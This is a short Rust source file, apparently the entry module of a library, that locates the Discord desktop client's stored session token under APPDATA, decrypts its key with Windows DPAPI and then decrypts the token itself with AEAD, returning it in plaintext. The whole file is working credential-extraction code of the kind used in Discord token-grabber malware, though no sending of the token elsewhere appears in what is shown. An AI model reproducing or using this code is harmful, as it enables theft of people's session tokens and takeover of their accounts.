mod decrypt_token;
mod electron_extract;
mod error;
mod string_key;

pub use error::ExtractDiscordTokenError;
use std::env;
use std::path::Path;

pub fn get_discord_token() -> Result<String, ExtractDiscordTokenError> {
    let appdata_path_str = env::var("APPDATA")?;
    let appdata_dir = Path::new(&appdata_path_str);

    let temp_path_str = env::var("TEMP")?;
    let temp_dir = Path::new(&temp_path_str);

    let mut token_buf = electron_extract::extract_encrypted_token(appdata_dir, temp_dir)?;
    let decrypted_key =
        decrypt_token::win32_decrypt(&mut electron_extract::extract_encrypted_key(appdata_dir)?)?;
    let decrypted_token = decrypt_token::aead_decrypt_inplace(&mut token_buf, &decrypted_key)?;

    Ok(decrypted_token.to_owned())
}
